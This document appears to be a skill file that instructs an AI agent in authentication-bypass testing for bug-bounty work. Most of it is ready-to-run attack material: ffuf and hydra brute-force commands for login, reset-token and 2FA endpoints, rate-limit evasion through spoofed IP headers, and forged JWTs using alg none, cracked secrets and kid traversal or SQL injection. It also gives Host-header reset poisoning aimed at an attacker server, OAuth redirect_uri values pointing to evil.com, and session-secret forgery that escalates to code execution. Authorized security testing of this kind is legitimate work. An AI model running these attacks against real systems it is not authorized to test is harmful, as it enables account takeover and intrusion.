---
name: auth-bypass
description: Authentication bypass — JWT attacks (none alg, weak secret, alg confusion, kid path traversal/SQLi), password reset poisoning (Host header), 2FA brute force, remember-me token analysis, parameter modification bypass, OAuth issues, default credentials, direct access bypass (302 intercept), and host-header auth bypass. Use when HauntMode flags authentication as APPLIES/MAYBE, when testing login/reset/2FA flows, or when you need an end-to-end auth testing methodology.
---

# Auth Bypass — Broken Authentication & Mechanism Attacks

This skill covers the full broken authentication attack surface: stateless token attacks (JWT), password reset logic flaws, 2FA weaknesses, session token analysis, parameter-based bypasses, host-header tricks, and brute-force approaches. Read top to bottom on first invocation; jump to the section for follow-up work.

---

## 1. Triggers — when this skill applies

- Any JWT in a cookie, `Authorization: Bearer` header, or response body
- Password reset flow — especially if the reset link contains a short numeric or guessable token
- 2FA / TOTP code submission — look for lack of rate limiting
- A `remember_me` or persistent login cookie
- POST login body that contains `isAdmin=false`, `role=user`, `user_id=183`, or similar tamper-worthy fields
- URL parameters like `?admin=true`, `?user_id=X` on protected pages
- OAuth flows with a `state` parameter or an explicit `redirect_uri`
- Any admin panel — try default credentials immediately
- Login page that returns different error messages for valid vs. invalid usernames (enumeration)
- App that redirects to login but sends the protected page body in the 302 response

---

---

## 3. 30-second triage

On first contact with an auth flow:

1. **Find the session/auth token type.** Cookie? Bearer token? Base64? JWT?
2. **Check for direct access bypass.** Browse to `/admin.php` without authenticating. If 302, intercept the response and change it to 200.
3. **Check URL parameters.** After login, note any `?user_id=`, `?role=`, `?admin=` in the URL. Try tampering.
4. **Find the password reset flow.** Is the reset token short/numeric? Is the username in a hidden field at the reset step?
5. **Find 2FA if present.** Is the TOTP 4 or 6 digits? Try without rate limiting.
6. **Inspect the JWT.** Paste at jwt.io. Note `alg`, `sub`, `role`, `isAdmin` claims.
7. **Try default credentials.** Always. Especially on admin panels.

---

## 4. Default credentials

Always try these first on any login panel. Do not skip.

```
admin:admin
admin:password
admin:admin123
admin:Password1
admin:
root:root
root:toor
administrator:administrator
test:test
guest:guest
```

Resources:
- https://www.cirt.net/passwords
- `~/SecLists/Passwords/Default-Credentials/`

---

## 5. User enumeration

Different error messages for valid vs. invalid users allow targeted attacks:

```
[RUN THIS]
ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt \
  -u https://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" \
  -fr "Unknown user" -t 20
```
Filter on the "unknown user" message — hits are valid usernames.

---

## 6. Brute-force passwords

Build a targeted wordlist matching the observed password policy:
```bash
grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt \
  | grep '[[:lower:]]' \
  | grep '[[:digit:]]' \
  | grep -E '.{10}' > /tmp/custom_wordlist.txt
```

```
[RUN THIS]
ffuf -w /tmp/custom_wordlist.txt \
  -u https://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -fr "Invalid username"
```

Hydra alternative for HTTP-form-post:
```
[RUN THIS]
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -t 10
```

---

## 7. Rate limit bypass

If rate limiting blocks brute-force after N attempts, try randomizing the source IP via header injection:

Add to each request: `X-Forwarded-For: <random_IP>` — many rate limits key on this header when behind a reverse proxy.

In ffuf:
```
[RUN THIS]
ffuf -w /tmp/wordlist.txt \
  -u https://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: FUZZ2" \
  -d "username=admin&password=FUZZ" \
  -w2 /tmp/ips.txt \
  -fr "Too many requests"
```
Or use Burp Intruder with a "Pitchfork" attack mode pairing password + random IP.

Also try:
- `X-Real-IP: <random>`
- `X-Originating-IP: <random>`
- `True-Client-IP: <random>`

---

## 8. Password reset — weak token brute force

**Detection:** Request a reset for your test account. Note the token in the email/URL. Is it a short numeric value (4 digits = 10,000 possibilities)?

```bash
seq -w 0 9999 > /tmp/tokens.txt
```

```
[RUN THIS]
ffuf -w /tmp/tokens.txt \
  -u https://target.com/reset_password.php?token=FUZZ \
  -fr "The provided token is invalid"
```

For 6-digit TOTP-style tokens:
```bash
seq -w 0 999999 > /tmp/tokens6.txt
```

---

## 9. Password reset — manipulating the username parameter

Multi-step reset flows often pass the target username in a hidden POST field at the final step. Intercept and change it:

```
POST /reset_password.php HTTP/1.1
...
password=NewP@ss&username=admin   # changed from htb-stdnt to admin
```

Also check the security question step — if username is in the POST body, change it to `admin` and supply your own account's security answer.

---

## 9.5 Invite token used without email verification

When a platform has an invite-based registration flow, invite tokens are often associated with a specific email address in the database. If the invite acceptance endpoint doesn't verify that the requestor's email matches the one the token was issued for, any valid invite token can be used to authenticate as — or take over — the account that was invited.

**Test pattern:**
1. Obtain a valid invite token for a target account (via info-disclosure, GraphQL leak — see info-disclosure §12.1, or from an invite email you receive)
2. Submit the invite token at the acceptance endpoint without providing the associated email — or provide a *different* email address
3. If the server accepts the token and creates/logs into the associated account → ATO

**What to look for:**
- `POST /invitations/accept`, `GET /invite?token=`, `/join?code=`, `/register?invite=` endpoints
- Endpoints that take a token and a new password but don't validate the email field matches
- Endpoints where the token alone (no email, no further verification) completes authentication

**Chain with info-disclosure §12.1:** GraphQL queries that return invitation tokens for other users can supply the tokens for this attack.

---

## 10. Password reset — Host header poisoning

If the app generates the reset link using the `Host` header (e.g., `https://<Host>/reset?token=XYZ`), inject your server into the Host header and the reset link will call back to you with the victim's token.

**Test steps:**
1. Trigger a password reset for a victim account (or your test account).
2. Intercept the reset request in Burp.
3. Change `Host: target.com` to `Host: your-server.com` (or `Host: target.com` + `X-Forwarded-Host: your-server.com`).
4. Forward the request.
5. Monitor your server (or ezXSS callback) for an incoming request with the reset token in the URL.

Try variations if the simple host replacement is blocked:
```
Host: target.com:@your-server.com
Host: target.com.your-server.com     # if filter checks postfix only
X-Forwarded-Host: your-server.com
X-Host: your-server.com
```

OOB listener command (one-liner nc on your VPS, or use ezXSS callback URL as the host).

---

## 11. 2FA brute force

**Detection:** Login with valid creds, land on the 2FA page. Note the TOTP field name (e.g., `otp`). Try submitting wrong codes — does the app enforce a lockout or rate limit?

4-digit TOTP (10,000 combinations):
```bash
seq -w 0 9999 > /tmp/totp4.txt
```

6-digit TOTP (1,000,000 combinations — only feasible if no rate limit):
```bash
seq -w 0 999999 > /tmp/totp6.txt
```

```
[RUN THIS]
ffuf -w /tmp/totp4.txt \
  -u https://target.com/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<your-authenticated-session-after-password-step>" \
  -d "otp=FUZZ" \
  -fr "Invalid 2FA Code" \
  -t 5
```

**Note:** Your session cookie must be from after the password step but before 2FA completion. The first hit is the correct TOTP. After it hits, all subsequent requests redirect to the protected page — stop there.

**2FA bypass tricks:**
- Try accessing the post-login page directly (skip the 2FA step entirely — direct access bypass)
- Submit `otp=` (empty) — some apps skip validation if the field is blank
- Use a code you previously used — some apps don't invalidate used TOTPs
- Try backup codes if you can enumerate them (`00000000`, `11111111`, etc.)

---

## 12. Direct access bypass (302 interception)

If a protected page sends the response body inside a 302 redirect:

1. In Burp, enable "Intercept" on responses.
2. Browse to `/admin.php` while not logged in.
3. When Burp shows the response, change `302 Found` → `200 OK`.
4. Forward — the browser renders the protected content.

**Indicator code (reference):**
```php
if(!$_SESSION['active']) {
    header("Location: index.php");
    // NO exit; after this — vulnerable!
}
```

**Sensitive action API bypasses UI-layer confirmation check:** When the UI requires a recent password confirmation before a sensitive action (generate app token, change email, disable 2FA, export data), the backing API endpoint may not enforce the same check. Directly calling the raw API endpoint skips the middleware that validates the confirmation.

Test pattern:
1. Trigger the sensitive action in the UI — intercept and note the raw API endpoint called
2. Also check JS source or network tab for related endpoints (e.g. `/api/getapppassword`, `/api/tokens/generate`)
3. Call that endpoint directly with only your normal session cookie (no prior confirmation step)
4. If it succeeds, the confirmation check is UI-only

---

## 13. Parameter modification bypass

After login, observe the URL or POST body for access-control parameters:

- `GET /admin.php?user_id=183` → try `?user_id=1` or `?user_id=0` (often admin)
- POST body with `isAdmin=false` → change to `isAdmin=true`
- POST body with `role=user` → change to `role=admin`
- Cookie containing `role=user` in base64 → decode, modify, re-encode (see `session-attacks` skill §5)

Brute-force the user_id if the admin's ID is unknown:
```
[RUN THIS]
ffuf -w /tmp/ids.txt \
  -u https://target.com/admin.php?user_id=FUZZ \
  -b "PHPSESSID=<your-session>" \
  -fr "Access denied"
```

---

## 14. JWT attacks

Paste the JWT at https://jwt.io to inspect claims. Then attack:

### 14.1 None algorithm

Remove the signature entirely and set `alg` to `none` (or `None`, `NONE`, `nOnE`):

```bash
# Decode header and payload
echo -n "<header_part>" | base64 -d
echo -n "<payload_part>" | base64 -d

# Craft new JWT
# Header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
# Payload: modify claims (e.g., isAdmin: true)
echo -n '{"sub":"htb-stdnt","isAdmin":true}' | base64 | tr -d '='
# Combine: header.payload.   (note empty signature with trailing dot)
```

Result: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJodGItc3RkbnQiLCJpc0FkbWluIjp0cnVlfQ.`

### 14.2 Weak secret brute force

If the JWT uses `HS256`, the secret may be weak. Extract the full JWT and crack it:

```
[RUN THIS]
hashcat -a 0 -m 16500 '<full_jwt_token>' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Once the secret is found, forge a new JWT at jwt.io with the recovered secret and modified claims.

### 14.3 RS256 → HS256 algorithm confusion

If the server uses RS256 (asymmetric), it has a public key. Some libraries accept an HS256 JWT signed with the public key as the secret:

1. Obtain the server's public key (from `/.well-known/jwks.json`, `X-JWK-Set`, or error responses)
2. Change `alg` in the JWT header from `RS256` to `HS256`
3. Sign the JWT with the public key bytes as the HMAC secret

### 14.4 kid path traversal

If the JWT header contains `kid` (key ID), the server may use it to locate the signing key on disk:

```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```

If the server reads the file at `kid` path as the signing secret, and `kid` points to `/dev/null` (empty file), the effective secret is an empty string `""`. Sign the JWT with an empty string secret.

Variations:
- `../../../../../../../dev/null`
- Any predictable file with known content (`/proc/sys/kernel/randomize_va_space` often = `"2"`)

### 14.5 kid SQLi

If `kid` is used in a SQL query to look up the key:
```json
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'attackersecret' -- "}
```
Sign the JWT with `attackersecret` as the HMAC secret. If the SQL injection causes the server to use your injected value as the key, the signature verifies.

### 14.6 RS256 n-factor forgery (sig2n)

If you have two JWTs signed with the same RSA key, you can extract the public key:
```
[RUN THIS]
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n
docker run -it sig2n /bin/bash
python3 jwt_forgery.py <TOKEN_1> <TOKEN_2>
```
This produces candidate public keys. Forge JWTs in CyberChef using the candidate key with HS256.

---

## 15. Host-header auth bypass (admin local-only)

If the app shows "Admin area accessible locally only" or similar:

**Simple bypass:**
```
GET /admin.php HTTP/1.1
Host: localhost
```

**If localhost is blocked, try:**
- `Host: 127.0.0.1`
- `Host: 0x7f000001` (hex localhost)
- `Host: 2130706433` (decimal localhost)
- `Host: 0177.0000.0000.0001` (octal)
- `Host: 0` (zero)
- `Host: 127.1`
- `Host: ::1`
- `Host: localtest.me`
- `Host: [::ffff:127.0.0.1]`

**If validation checks the domain:**
```
# Append port to bypass parser
Host: target.com:1337

# Postfix confusion (server checks if Host ends with target.com)
Host: eviltarget.com

# Subdomain bypass (server checks if target.com is in Host)
Host: target.com.attacker.com
```

**Fuzz internal IP ranges** if the app allows specific internal IPs:
```
[RUN THIS]
for a in {1..255}; do for b in {1..255}; do echo "192.168.$a.$b"; done; done > /tmp/ips.txt
ffuf -u https://target.com/admin.php -w /tmp/ips.txt -H 'Host: FUZZ' -fs 752
```

---

## 16. OAuth flow issues

- **Missing `state` parameter:** CSRF against the OAuth flow. Attacker can initiate login-with-OAuth and make victim complete it, linking attacker's account to victim's identity.
- **Open redirect in `redirect_uri`:** If the app validates `redirect_uri` by prefix only, try `redirect_uri=https://target.com.evil.com` or `redirect_uri=https://target.com/logout?next=https://evil.com`. The auth code is delivered to the attacker.
- **Path traversal in `redirect_uri`:** If the app validates that `redirect_uri` starts with an allowed prefix but doesn't normalize `..` sequences, append a traversal to escape the allowed path while still passing the prefix check: `redirect_uri=https://target.com/callback/../../../attacker/path`. The server sees the prefix match; the browser resolves `../` and delivers the auth code to the traversed destination. Useful when the attacker controls a page elsewhere on the same domain (e.g. a product page, user profile, or uploaded file path).
- **`redirect_uri` not validated:** Change it to your server entirely. The auth code arrives at your server.
- **Auth code reuse:** Try submitting the same auth code twice — some servers don't invalidate used codes.
- **Trusted application mass assignment:** When creating or editing an OAuth application, intercept the save request and append a `trusted=1` (or `doorkeeper_application[trusted]=1` in Rails) parameter to the POST/PUT body. If the server accepts it, the app becomes "trusted by default" — users are silently authorized without seeing the consent screen. Send the authorization URL to any user; the auth code arrives at your redirect_uri with no user interaction required. Test: compare the OAuth flow for a normal app (shows consent) vs. the tampered app (redirects straight to your callback with a code).
- **Access token leakage via Referer header:** If the app appends the OAuth access token to a redirect URL as a fragment or query parameter (e.g., `https://app.com/callback#access_token=TOKEN`), and that landing page loads third-party resources (analytics, CDNs, tracking pixels), the full URL — including the token — is sent as the `Referer` header to those third parties. Test: after completing an OAuth flow, check whether the callback URL contains the token as a URL parameter or fragment. If yes, inspect what third-party requests are made from the callback page and whether `Referer` is sent. Token in URL = leaks to any subresource on that page.
- **Unverified email claim → third-party ATO:** When a user authenticates via a third-party OAuth provider (Google, GitHub, etc.) and the app maps the incoming email claim to an existing account without verifying that the provider actually confirmed the email, an attacker can register with the target provider using an unverified email matching a victim's account on the target app. The app trusts the claim and logs the attacker in as the victim. Test: register a new OAuth account at the provider with the victim's email but do not verify it; attempt OAuth login to the target app. If the app accepts the unverified email claim from the provider and maps it to the existing account, it's vulnerable.

---

## 16.5 SAML entityId trailing whitespace bypass

When an app matches incoming SAML responses to the correct SSO organization by looking up the `entityId` (Identity Provider Issuer), the lookup may use `trim()` to normalize the value. If an attacker registers a new SSO organization with the same `entityId` as a legitimate one but with a trailing space (`myentity ` instead of `myentity`), the app may:

1. Authenticate the user against the legitimate SSO (SAML response issuer matches after trim)
2. Then add/log-in the user to the attacker's organization (lookup finds attacker's `entityId` with the space, which sorts before or is prioritized over the canonical one)

**Impact variants:**
- **DoS:** Legitimate users can no longer log into their organization — SSO lookup resolves to attacker's org
- **Account takeover:** New users or users removed from the legitimate org who try SSO get added to the attacker's org instead

**Test:**
1. Create a new SSO-enabled organization
2. Set the `entityId` to match a target organization's entityId with one trailing space
3. Have a user attempt SSO to the legitimate organization
4. Check which organization they land in

The bug is in trim-then-lookup patterns where the lookup uses the original (untrimmed) value.

---

## 16.6 Signed session cookie with weak or default secret

When a framework (Flask, Redash, or any app using itsdangerous/similar) signs session cookies with a static secret key, the signature can be brute-forced offline. Once the secret is recovered, you can forge arbitrary session data.

**Detection:** Flask session cookies start with a dot-separated base64 payload: `eyJ....<hash>`. Redash and similar apps may use the same itsdangerous `URLSafeTimedSerializer`.

**Crack the secret:**
```bash
# Install flask-unsign if needed: pip3 install flask-unsign
flask-unsign --unsign --cookie 'SESSION_COOKIE_VALUE' --wordlist /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --no-literal-eval
```

**Forge a session with the recovered secret:**
```bash
# Example: escalate user_id to 1 (admin) or set role
flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin'}" --secret 'RECOVERED_SECRET'
```

Replace the session cookie with the forged value. Also test with default/common secrets before running rockyou: `secret`, `SECRET_KEY`, `mysecret`, `flask`, `development`, `changeme`, the app name.

**When to apply:** Any app using Flask sessions, Redash, or apps with itsdangerous-based signing where you can observe the cookie format.

**Rails `secret_key_base` — same pattern, higher stakes:** Rails signs cookies and internal tokens with `secret_key_base`. If this value is exposed (via error page, git leak, `.env` file — see info-disclosure §4), you can forge signed session cookies and any `ActiveSupport::MessageVerifier` token.

```bash
# Forge a Rails signed cookie with known secret_key_base
# Use rails-secret or construct manually; quickest via a local Rails console:
# ActiveSupport::MessageVerifier.new(SECRET).generate({user_id: 1, role: 'admin'})
```

**Critical escalation:** Rails `ActiveSupport::MessageVerifier` and `MessageEncryptor` use **Marshal** as the default serializer (not JSON). A forged token that is deserialized triggers Marshal gadget chains → RCE. If the app uses `cookies.signed` or `cookies.encrypted` anywhere, and you have `secret_key_base`, this is full RCE via deserialization — not just session forgery. Cross-invoke the `deserialization` skill for gadget chain generation.

---

## 17. Bypass techniques

| Bypass | Method |
|---|---|
| Rate limit on brute force | `X-Forwarded-For` rotation |
| CAPTCHA present | Check if CAPTCHA solution is in HTML source (sometimes it is) |
| 2FA present | Direct access bypass, blank OTP, backup codes |
| Password policy blocks wordlist | Filter wordlist with grep to match policy |
| JWT signature check | `none` alg, weak HS256 secret, alg confusion |
| Host header validation | Port appended, postfix confusion, encoding tricks |
| Parameter check | Empty value, null, different encoding |
| Security questions | OSINT + ffuf on city/pet name wordlists |

---

## 18. False-positive checks

- **JWT `none` alg rejected:** Some libraries are patched and reject `alg=none` explicitly. Confirm by looking at the response — 401 with "Algorithm not accepted" vs. a 200 means no bypass.
- **Password reset email never arrives:** Confirm the email endpoint is live and you control the account before claiming the token is brute-forceable.
- **2FA lockout after 5 attempts:** If lockout occurs, rate-limit bypass may be needed. Confirm `X-Forwarded-For` rotation actually affects rate limiting before running the full brute force.
- **Host header reflected but no auth bypass:** Reflection alone in CSS/JS paths is a cache-poisoning / defacement issue, not an auth bypass. Confirm by checking if the admin panel content is actually returned.
- **Parameter modification changes a response field but no privilege escalation:** Changing `role=admin` in a response may just change the UI label without changing server-side authorization.

---

## 19. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Auth bypass via JWT none-alg → admin panel | `idor`, `session-attacks` | Full admin access |
| Password reset Host header poison → ATO | `xss` (if phishing link needed) | ATO of any account |
| Weak HS256 secret → forged admin JWT | — | Admin privilege escalation |
| 2FA brute-force → ATO even with valid credentials | — | Bypasses second factor |
| Direct access bypass (302 intercept) → admin page | `idor` | Admin data exposure |
| Parameter modification `user_id` → IDOR | `idor` | Horizontal privilege escalation |
| OAuth open redirect → auth code theft | — | Account takeover via OAuth |
| Host-header bypass → admin panel | `xss` (if cache-poisoning chained) | Admin access or mass poisoning |
| Session token tampering (base64 role) | `session-attacks` | Instant privilege escalation |

---

## 20. Reporting template

```
POTENTIAL FINDING: <JWT None Algorithm | Weak JWT Secret | JWT Algorithm Confusion | Password Reset Token Brute-Force | Password Reset Host Header Poisoning | Password Reset Username Manipulation | 2FA Brute-Force | Parameter Modification Auth Bypass | Direct Access Bypass | Host Header Auth Bypass | Default Credentials>
Target: <full URL / endpoint>
Parameter: <param name / header name / cookie>
Evidence:
    <e.g., "JWT with alg=none accepted: forged token with isAdmin=true returned 200 /admin.php" |
     "Reset token 4 digits — ffuf hit on token=6182 for admin account" |
     "Host: localhost bypasses auth check on /admin.php — full admin panel rendered">
Exploitation method:
    <step-by-step of what was executed>
Impact:
    <e.g., "Full admin account takeover" | "Bypass 2FA for any account with known credentials" | "Reset password of any user without knowing their security question">
Chain potential: <other findings that compound impact>
Next step: <e.g., "Confirm admin JWT forgery opens all admin functionality", "Verify reset token is space shared across concurrent resets to target multiple users simultaneously">
```

---

## 21. Recon tracker vector strings

Only log if the user explicitly authorizes (CLAUDE.md hard rule):

- `auth:jwt-none-alg` — JWT none algorithm accepted
- `auth:jwt-weak-secret:<hashcat-cracked>` — HS256 secret cracked
- `auth:jwt-alg-confusion` — RS256→HS256 confusion
- `auth:jwt-kid-traversal` — kid path traversal
- `auth:reset-token-brute:<N>digits` — weak reset token
- `auth:reset-host-poison` — Host header injection in reset email
- `auth:reset-username-param` — username in hidden POST field at reset step
- `auth:2fa-brute:<N>digits` — 2FA brute-forced
- `auth:param-bypass:<param>` — auth bypass via named parameter
- `auth:direct-access` — 302 body leaks protected content
- `auth:host-header:<bypass-value>` — host header bypasses local-only check
- `auth:default-creds:<user>:<pass>` — default credentials accepted

---

## 22. What NOT to do

- **Do not run high-concurrency brute-force against production login pages.** Check `program-guidelines.txt` for rate limits. Use `-t 5` or lower. Account lockouts on real users = out-of-scope impact.
- **Do not send Host-header-poisoned password reset emails to real users.** Only test on accounts you control.
- **Do not crack JWT secrets with hashcat at maximum speed against production** — generate unusual traffic patterns. Run on local test tokens only until you have a candidate.
- **Do not exfiltrate real user data** from admin panels reached via auth bypass — take a screenshot of the admin panel index to prove access, then stop.
- **Do not test 2FA brute-force on accounts that will lock out real users** — create a test account if the program allows it.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not skip re-reading `program-guidelines.txt`** before running any automated tool — rate limits and required headers vary per program.
